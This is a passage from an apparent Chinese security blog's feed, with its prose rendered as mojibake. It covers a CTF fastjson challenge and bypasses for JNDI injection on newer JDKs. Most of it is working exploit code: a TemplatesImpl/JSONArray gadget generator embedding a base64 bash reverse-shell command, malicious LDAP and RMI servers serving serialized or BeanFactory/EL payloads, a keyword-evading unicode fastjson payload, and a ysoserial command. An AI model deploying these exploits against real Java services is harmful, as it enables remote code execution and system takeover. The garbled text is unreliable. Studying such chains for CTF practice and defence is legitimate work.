åŒæ ·ä¹Ÿæç¤ºäº†æˆ‘ä»¬fastjsonç‰ˆæœ¬ä¸º1.2.48ï¼Œå¯ä»¥åˆ©ç”¨1.2.48çš„expæ‰“æˆ–è€…ç›´æ¥ç”¨1.2.83çš„å…¨ç‰ˆæœ¬åŸç”Ÿååºåˆ—åŒ–åˆ©ç”¨ã€‚<br>
å¦‚ä¸‹</p>
<pre><code class="language-java">import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class FastNativeAll {
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] genPayload(String cmd) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass(&quot;a&quot;);
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;&quot;+cmd+&quot;\&quot;);&quot;);
        clazz.addConstructor(constructor);
        clazz.getClassFile().setMajorVersion(49);
        return clazz.toBytecode();
    }

    public static void main(String[] args) throws Exception{


        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, &quot;_bytecodes&quot;, new byte[][]{genPayload(&quot;bash -c {echo,base64ç¼–ç payload}|{base64,-d}|{bash,-i}&quot;)});
        setValue(templates, &quot;_name&quot;, &quot;qiu&quot;);
        setValue(templates, &quot;_tfactory&quot;, null);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        setValue(bd,&quot;val&quot;,jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templates,bd);


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        objectOutputStream.close();
        byte[] serialize = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(serialize));

//        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
//        objectInputStream.readObject();

    }
}
</code></pre>
<p>ä½†æ˜¯å‘¢ï¼Œå¦‚æœè¿™é‡Œç›´æ¥èµ·jndiæœåŠ¡æ‰“æ³¨å…¥å‘ç°è¿˜æ˜¯ä¸å¯è¡Œçš„ï¼Œå› ä¸ºæˆ‘ä»¬ä¹‹å‰dnslogæ¢æµ‹è¿‡ï¼Œè¿™é‡Œä½¿ç”¨çš„javaç‰ˆæœ¬æ˜¯8u222æ˜¯é«˜äº8u191çš„ï¼Œè¿™é‡Œå°±è¿‡ä¸å»è¿œç¨‹codebaseçš„æ£€æµ‹é™åˆ¶ï¼Œå¯¼è‡´æ— æ³•åˆ©ç”¨æˆåŠŸã€‚<br>
è¯¦æƒ…å¯ä»¥è§ä¸Šä¸€ç¯‡æ–‡ç« ã€‚<br>
ç„¶åæˆ‘ä»¬å°±åˆ©ç”¨é«˜ç‰ˆæœ¬ldapç»•è¿‡èµ·æœåŠ¡æ‰“</p>
<pre><code class="language-java">package Qiu;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;
import org.apache.commons.io.FileUtils;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
//é«˜ç‰ˆæœ¬LDAPç»•è¿‡

public class LDAPServer {
    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;

    public static void main (String[] tmp_args ) throws Exception{
        if (tmp_args.length &lt; 2) {
            System.out.println(&quot;Usage: java xxx.jar &lt;IP&gt; &lt;file&gt;&quot;);
            System.exit(1);
        }

        String ip = tmp_args[0];
        String[] args = new String[]{&quot;http://&quot; + ip +&quot;/#Evail&quot;};
        String payload = &quot;&quot;;
        File file = new File(tmp_args[1]);
        try {
            payload = FileUtils.readFileToString(file);
            System.out.println(payload);
        } catch (IOException e) {
            e.printStackTrace();
        }

        int port = 6666;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                &quot;listen&quot;, //$NON-NLS-1$
                InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]), payload));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;
        private String payload;

        public OperationInterceptor ( URL cb , String payload) {
            this.codebase = cb;
            this.payload = payload;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e, payload);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult (InMemoryInterceptedSearchResult result, String base, Entry e , String payload) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(&quot;.class&quot;));
            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);
            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos &gt; 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(payload));
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
</code></pre>
<p>è¿™é‡Œä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ï¼Œæˆ‘æ”¹äº†ä¸€ä¸‹ï¼ŒæŠŠipå’Œpayloadä½œä¸ºå‘½ä»¤å‚æ•°ä¼ å…¥ï¼Œå°†payloadæ”¾å…¥æ–‡ä»¶ä¸­è¯»å–ï¼Œéœ€è¦base64ç¼–ç ã€‚ä¹Ÿè¦æ³¨æ„æœ€åä¸è¦å¤šå‡ºæ¢è¡Œæˆ–è€…ç©ºæ ¼ï¼Œå¦åˆ™ä¼šå¯¼è‡´è§£ç å¤±è´¥ã€‚<br>
ç¼–è¯‘æˆjaråŒ…åæ”¾åˆ°æœåŠ¡å™¨ä¸Šè¿è¡Œ<br>
<img src="https://sl3epf.github.io/post-images/1703735792897.png" alt="" loading="lazy"><br>
æ¥æ”¶åˆ°è¯·æ±‚äº†ï¼ŒåŒæ—¶ncç›‘å¬å¤„ä¹Ÿå¼¹å›äº†shell<br>
<img src="https://sl3epf.github.io/post-images/1703735835994.jpg" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[JDK8u191ç‰ˆæœ¬åçš„JNDIæ³¨å…¥ç»•è¿‡]]></title>
        <id>https://sl3epf.github.io/post/jdk8u191hou-de-jndi-zhu-ru-rao-guo/</id>
        <link href="https://sl3epf.github.io/post/jdk8u191hou-de-jndi-zhu-ru-rao-guo/">
        </link>
        <updated>2023-12-23T05:07:36.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<h1 id="å‰è¨€">å‰è¨€</h1>
<p>æœ€è¿‘åˆçœ‹äº†ä¸‹fastjsonï¼Œæƒ³åˆ°ä¹‹å‰æŸä¸ªæ¯”èµ›ä¸€é“é¢˜ï¼Œè¿™ä¸¤å¤©åˆæ‹¿èµ·æ¥çœ‹äº†çœ‹ã€‚</p>
<h1 id="åˆ†æ">åˆ†æ</h1>
<p>é¦–å…ˆçœ‹é¢˜ç›®å’Œä¾èµ–<br>
<img src="https://sl3epf.github.io/post-images/1703308816770.jpg" alt="" loading="lazy"><br>
<img src="https://sl3epf.github.io/post-images/1703308825351.jpg" alt="" loading="lazy"><br>
ç¬¬ä¸€çœ¼å°±çœ‹åˆ°fastjson1.2.47ï¼Œè¿™ä¸ªç‰ˆæœ¬è‚¯å®šæ˜¯å¯ä»¥æ‰“çš„ï¼Œå°±æ˜¯é€šè¿‡ååºåˆ—åŒ–å¾€<code>mapping</code>ä¸­æ·»åŠ ä»»ä½•ç±»ï¼Œè¿™æ ·çš„è¯æ·»åŠ <code>com.sun.rowset.JdbcRoSetImpl</code>ç±»ï¼Œä»è€Œç»•è¿‡<code>autoTypeSupport</code>çš„å’Œé»‘åå•çš„é™åˆ¶ï¼Œç„¶åå†æ¬¡ä¼ é€’jsonå»è§¦å‘<code>JdbcRowSetImpl</code>çš„JNDIæ³¨å…¥ã€‚<br>
å…¶ä¸­å¯ä»¥å‘ç°å®ƒè¿˜æœ‰è¿™äº›æ­£åˆ™é™åˆ¶</p>
<pre><code class="language-java">Pattern p = Pattern.compile(&quot;JdbcRowSetImpl|type|dataSourceName|autoCommit|TemplatesImpl|bytecodes|BasicDataSource&quot;, 8);
        boolean isMatch = p.matcher(decode).find();
        if (!isMatch)
            try {
                JSON.parse(decode);
            } catch (Exception e) {
                resp = &quot;Maybe Username or Password error!&quot;;
            }
</code></pre>
<p>è¿™ä¸ªåœ°æ–¹çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“Fastjsoné»˜è®¤ä¼šå»é™¤é”®ã€å€¼å¤–çš„ç©ºæ ¼ã€<code>\b</code>ã€<code>\n</code>ã€<code>\r</code>ã€<code>\f</code>ç­‰ï¼ŒåŒæ—¶è¿˜ä¼šè‡ªåŠ¨å°†é”®ä¸å€¼è¿›è¡Œunicodeä¸åå…­è¿›åˆ¶è§£ç ã€‚<br>
æˆ‘ä»¬é‡‡ç”¨ä¸€ä¸ªå…³é”®å­—ç¼–ç ç»•è¿‡å°±å¯ä»¥</p>
<pre><code class="language-java">{
    &quot;1&quot;: {
        &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;, 
        &quot;val&quot;: &quot;com.sun.rowset.\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;
    }, 
    &quot;2&quot;: {
        &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;com.sun.rowset.\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;, 
        &quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;: &quot;ldap://127.0.0.1:6666/Evail&quot;, 
        &quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;: true
    }
}
</code></pre>
<p>è¿™ä¸ªå¼€å§‹åœ¨æœ¬åœ°æ‰“ç”¨jdk8u65ä½ç‰ˆæœ¬æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚<br>
ä½†æ˜¯åœ¨è¿œç¨‹æ‰“å¹¶ä¸èƒ½é€šã€‚äºæ˜¯æœ€å¼€å§‹è€ƒè™‘æ˜¯ä¸æ˜¯ä¸å‡ºç½‘<br>
åˆè€ƒè™‘åˆ°äº†<code>Templates</code>é“¾è¦å¼€å¯<code>Feature.SupportNonPublicField</code>ï¼Œ<code>BCELã€c3p0ã€Commons-io</code>éƒ½æ˜¯æ²¡æœ‰è¿™ä¸ªä¾èµ–çš„ã€‚<br>
ä½†æ˜¯æˆ‘ä»¬åœ¨é¢˜ç›®ä¸­çœ‹åˆ°äº†è¿™ä¸¤ä¸ªä¾èµ–</p>
<pre><code>        &lt;dependency&gt;
            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
            &lt;version&gt;3.2.1&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;com.unboundid&lt;/groupId&gt;
            &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;
            &lt;version&gt;4.0.8&lt;/version&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
</code></pre>
<p>å‰é¢çš„CCå¾ˆç†Ÿæ‚‰ï¼Œåé¢é‚£ä¸ªæ˜¯ç”¨äºä¸ LDAP ç›®å½•æœåŠ¡å™¨è¿›è¡Œé€šä¿¡çš„ä¸€ä¸ªjavaåº“<br>
è¿™ä¼šä¸ä¼šå°±æ˜¯å‡ºé¢˜äººæç¤ºå‘¢ï¼Œç»•è¿‡é«˜ç‰ˆæœ¬jdkå®ç°jndiæ³¨å…¥æ‰“CCé“¾</p>
<h1 id="ç»•è¿‡">ç»•è¿‡</h1>
<p>æ‰€ä»¥ç°åœ¨å°±æ¥å­¦ä¹ ä¸€ä¸‹</p>
<p>æˆ‘ä»¬ä¸»è¦æ¥åˆ†æRMIå’ŒLDAPä¸¤ä¸ªæ”»å‡»å‘é‡<br>
ä¸åšå…·ä½“è°ƒè¯•äº†ï¼Œå°±çœ‹æ–°æ—§ç‰ˆæœ¬çš„æºç å¯¹æ¯”</p>
<h2 id="rmi">RMI</h2>
<p>åœ¨JDK 6u141ã€7u131ã€8u121ä¹‹åï¼Œå¢åŠ äº†com.sun.jndi.rmi.object.trustURLCodebaseé€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ã€‚<br>
å¯¹æ¯”ä¸‹JDKçš„com.sun.jndi.rmi.registry.RegistryContextç±»çš„decodeObject()å‡½æ•°<br>
æˆ‘è¿™é‡Œæ–°ç‰ˆç”¨çš„jdk8u391,æ—§ç‰ˆæ˜¯8u65</p>
<pre><code class="language-java">//8u391
private Object decodeObject(Remote var1, Name var2) throws NamingException {
        try {
            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
            Reference var8 = null;
            if (var3 instanceof Reference) {
                var8 = (Reference)var3;
            } else if (var3 instanceof Referenceable) {
                var8 = ((Referenceable)((Referenceable)var3)).getReference();
            }

            if (var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase) {
                throw new ConfigurationException(&quot;The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.&quot;);
            } else {
                return NamingManager.getObjectInstance(var3, var2, this, this.environment);
            }
        } catch (NamingException var5) {
            throw var5;
        } catch (RemoteException var6) {
            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
        } catch (Exception var7) {
            NamingException var4 = new NamingException();
            var4.setRootCause(var7);
            throw var4;
        }
    }

    //8u65
    private Object decodeObject(Remote var1, Name var2) throws NamingException {
        try {
            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
        } catch (NamingException var5) {
            throw var5;
        } catch (RemoteException var6) {
            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
        } catch (Exception var7) {
            NamingException var4 = new NamingException();
            var4.setRootCause(var7);
            throw var4;
        }
    }
</code></pre>
<p>ä¸»è¦å°±æ˜¯åŠ äº†ä¸€ä¸ªifåˆ¤æ–­<code>com.sun.jndi.rmi.object.trustURLCodebase</code>æ˜¯å¦ä¸ºtrueæ‰èƒ½è°ƒç”¨getObjectInstanceï¼Œæœ€åè°ƒç”¨loadClassè¿›è¡Œç±»åŠ è½½ï¼Œè€Œcodebaseé»˜è®¤ä¸ºfalse</p>
<h2 id="ldap">LDAP</h2>
<p>ldapçš„åˆ©ç”¨åœ¨JDK 6u211ã€7u201ã€8u191ä¹‹åï¼Œå¢åŠ äº†com.sun.jndi.ldap.object.trustURLCodebaseé€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢LDAPåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ã€‚<br>
å…³æ³¨com.sun.naming.internal.VersionHelper12#loadClassæ–¹æ³•</p>
<pre><code class="language-java">//8u391
public Class&lt;?&gt; loadClass(String className, String codebase)
            throws ClassNotFoundException, MalformedURLException {
        if (&quot;true&quot;.equalsIgnoreCase(trustURLCodebase)) {
            ClassLoader parent = getContextClassLoader();
            ClassLoader cl =
                    URLClassLoader.newInstance(getUrlArray(codebase), parent);

            return loadClass(className, cl);
        } else {
            return null;
        }
    }

    //8u65
    public Class&lt;?&gt; loadClass(String className, String codebase)
            throws ClassNotFoundException, MalformedURLException {

        ClassLoader parent = getContextClassLoader();
        ClassLoader cl =
                 URLClassLoader.newInstance(getUrlArray(codebase), parent);

        return loadClass(className, cl);
    }
</code></pre>
<p>åŒæ ·ä¹Ÿæ˜¯åŠ äº†ä¸€ä¸ªifåˆ¤æ–­com.sun.jndi.ldap.object.trustURLCodebaseæ˜¯å¦ä¸ºtrueï¼Œç„¶åæ‰èƒ½è°ƒç”¨URLClassLoaderåŠ è½½å™¨ã€‚<br>
è€Œcodebaseé»˜è®¤æ˜¯è¢«è®¾ç½®ä¸ºfalse</p>
<pre><code class="language-java">    private static final String TRUST_URL_CODEBASE_PROPERTY =
            &quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;;
    private static final String trustURLCodebase =
            AccessController.doPrivileged(
                new PrivilegedAction&lt;String&gt;() {
                    public String run() {
                        try {
                        return System.getProperty(TRUST_URL_CODEBASE_PROPERTY,
                            &quot;false&quot;);
                        } catch (SecurityException e) {
                        return &quot;false&quot;;
                        }
                    }
                }
            );
</code></pre>
<p>å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿæ ¹æ®https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA æœ‰ä¸¤ç§ç»•è¿‡æ–¹å¼</p>
<pre><code>ä¸¤ç§ç»•è¿‡æ–¹æ³•å¦‚ä¸‹ï¼š

1. æ‰¾åˆ°ä¸€ä¸ªå—å®³è€…æœ¬åœ°CLASSPATHä¸­çš„ç±»ä½œä¸ºæ¶æ„çš„Reference Object Factoryå·¥å‚ç±»ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªæœ¬åœ°çš„Factoryç±»æ‰§è¡Œå‘½ä»¤ã€‚

2. åˆ©ç”¨LDAPç›´æ¥è¿”å›ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼ŒJNDIæ³¨å…¥ä¼šå¯¹è¯¥å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œåˆ©ç”¨ååºåˆ—åŒ–Gadgetå®Œæˆå‘½ä»¤æ‰§è¡Œã€‚

è¿™ä¸¤ç§æ–¹å¼éƒ½éå¸¸ä¾èµ–å—å®³è€…æœ¬åœ°CLASSPATHä¸­ç¯å¢ƒï¼Œéœ€è¦åˆ©ç”¨å—å®³è€…æœ¬åœ°çš„Gadgetè¿›è¡Œæ”»å‡»ã€‚
</code></pre>
<h2 id="ä¸€-åˆ©ç”¨ldapè¿”å›æ¶æ„åºåˆ—åŒ–æ•°æ®è§¦å‘æœ¬åœ°ä¾èµ–ä¸­çš„gadget">ä¸€ã€åˆ©ç”¨LDAPè¿”å›æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°ä¾èµ–ä¸­çš„Gadget</h2>
<p>æˆ‘ä»¬é¦–å…ˆæ¥çœ‹ç¬¬äºŒç§åˆ©ç”¨æ–¹å¼ï¼Œè¿™ä¹Ÿæ˜¯ä¸Šé¢é¢˜ç›®çš„åˆ©ç”¨ç‚¹<br>
é¢˜ç›®ä¸­å­˜åœ¨CCé“¾ä¾èµ–ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨CC6æˆ–è€…å…¶ä»–çš„é“¾å»æ‰“<br>
å…ˆåˆ©ç”¨yuserialç”Ÿæˆpaylaodï¼Œç„¶åbase64ç¼–ç ä¸€ä¸‹</p>
<pre><code>java -jar ysuserial-1.5-su18-all.jar -g CommonsCollections9 -p 'open -a /System/Applications/Calculator.app' -f 9.ser


package Qiu;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class B64Evil {
    public static void main(String[] args) throws IOException {
        byte[] code = Files.readAllBytes(Paths.get(&quot;/xxxx/9.ser&quot;));

        System.out.println(Base64.getEncoder().encodeToString(code));
    }
}

</code></pre>
<p>ç„¶åæ„é€ æ¶æ„serverç«¯</p>
<pre><code class="language-java">package Qiu;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;
//é«˜ç‰ˆæœ¬LDAPç»•è¿‡

public class LDAPServer {
    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;

    public static void main ( String[] tmp_args ) throws Exception{
        String[] args=new String[]{&quot;http:/127.0.0.1:3377/#Evail&quot;};
        int port = 6666;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                &quot;listen&quot;, //$NON-NLS-1$
                InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult (InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(&quot;.class&quot;));
            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);
            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos &gt; 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;æ”¾å…¥ä½ åˆšåˆšç”Ÿæˆçš„payload&quot;));
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
</code></pre>
<p>å°†jdbcrowImplé“¾å­base64ç¼–ç <br>
<img src="https://sl3epf.github.io/post-images/1703318150626.png" alt="" loading="lazy"><br>
ç„¶åæ‰“å…¥<br>
<img src="https://sl3epf.github.io/post-images/1703318226979.png" alt="" loading="lazy"><br>
å‘ç°æˆåŠŸæ‰§è¡Œ<br>
æˆ‘ä»¬çš„serverç«¯ä¹Ÿæ”¶åˆ°äº†è¯·æ±‚<br>
<img src="https://sl3epf.github.io/post-images/1703318305511.png" alt="" loading="lazy"></p>
<h2 id="äºŒ-æœ¬åœ°æ¶æ„ç±»ä½œä¸ºreference-factory">äºŒã€æœ¬åœ°æ¶æ„ç±»ä½œä¸ºReference Factory</h2>
<p>ä¸»è¦å°±æ˜¯å—å®³è€…æœ¬åœ°ClassPathèƒ½å­˜åœ¨ä¸€ä¸ªFactory Classå¹¶ä¸”å¿…é¡»å®ç° <code>javax.naming.spi.ObjectFactory</code>æ¥å£ï¼Œå¹¶ä¸”è‡³å°‘å­˜åœ¨ä¸€ä¸ª<code>getObjectInstance()</code>æ–¹æ³•<br>
å¤§ä½¬å°±æ‰¾åˆ°äº†è¿™ä¸ª<code>org.apache.naming.factory.BeanFactory</code><br>
<img src="https://sl3epf.github.io/post-images/1703319774096.png" alt="" loading="lazy"></p>
<p>éœ€è¦ä¾èµ–</p>
<pre><code class="language-maven">&lt;dependency&gt;
    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
    &lt;version&gt;8.5.0&lt;/version&gt;
&lt;/dependency&gt;
&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.el&lt;/groupId&gt;
    &lt;artifactId&gt;com.springsource.org.apache.el&lt;/artifactId&gt;
    &lt;version&gt;7.0.26&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>ä½†æ˜¯è¿™ä¸ªelçš„åŒ…æˆ‘ä¸‹ä¸ä¸‹æ¥ï¼Œå°±ç›´æ¥å»ç½‘ä¸Šæ‰¾äº†ä¸ª<br>
https://archiva-repository.apache.org/archiva/repository/all-public/org/apache/el/com.springsource.org.apache.el/7.0.26/<br>
ç„¶åå¯¼å…¥äº†<br>
RMI Serverç«¯</p>
<pre><code class="language-java">package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiServer {
    public static void main(String[] args) throws Exception {
        System.out.println(&quot;[*]Evil RMI Server is Listening on port: 3377&quot;);
        Registry registry = LocateRegistry.createRegistry(3377);
        // å®ä¾‹åŒ–Referenceï¼ŒæŒ‡å®šç›®æ ‡ç±»ä¸ºjavax.el.ELProcessorï¼Œå·¥å‚ç±»ä¸ºorg.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);
        // å¼ºåˆ¶å°†'x'å±æ€§çš„setterä»'setX'å˜ä¸º'eval', è¯¦ç»†é€»è¾‘è§BeanFactory.getObjectInstanceä»£ç 
        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));
        // åˆ©ç”¨è¡¨è¾¾å¼æ‰§è¡Œå‘½ä»¤
        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash', '-c', 'open -na Calculator']).start()\&quot;)&quot;));
        System.out.println(&quot;[*]Evil command: open -na Calculator&quot;);
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind(&quot;Object&quot;, referenceWrapper);
    }
}
</code></pre>
<p>RMI Clientç«¯</p>
<pre><code class="language-java">package org.example;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JNDI_TEST {
    public static void main(String[] args) throws NamingException {
        Object object=new InitialContext().lookup(&quot;rmi://127.0.0.1:3377/Object&quot;);
    }
}
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://sl3epf.github.io/post-images/1703323409532.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œä¸»è¦è®°å½•åˆ©ç”¨æ‰‹æ³•ã€‚<br>
å…·ä½“æ¼æ´åˆ†ææµç¨‹ç½‘ä¸Šå¤§ä½¬å·²ç»å†™çš„å¾ˆæ¸…æ¥šäº†ã€‚å†é€ è½®å­å†™æ²¡å•¥å¤ªå¤§æ„ä¹‰ï¼Œä¸»è¦æ˜¯è‡ªå·±è°ƒä¸€éç†è§£ä¸€ä¸‹ã€‚</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ¢ä¸ªåœ°.]]></title>
        <id>https://sl3epf.github.io/post/test-my-site/</id>
        <link href="https://sl3epf.github.io/post/test-my-site/">
        </link>
        <updated>2023-12-19T07:27:11.000Z</updated>
        <summary type="html"><![CDATA[<p>Welcome</p>
]]></summary>
        <content type="html"><![CDATA[<p>Welcome</p>
<!-- more -->
<p>é‡æ–°æ‰¾äº†ä¸ªå†™ä½œçš„åœ°æ–¹ï¼Œä¹‹å‰çš„åšå®¢å·²ç»å¯„äº†ã€‚<br>
Grideaè¿˜ä¸é”™ï¼Œå°±æ˜¯ä¸æ”¯æŒç²˜è´´å›¾ç‰‡æœ‰ç‚¹éš¾å—ã€‚<br>
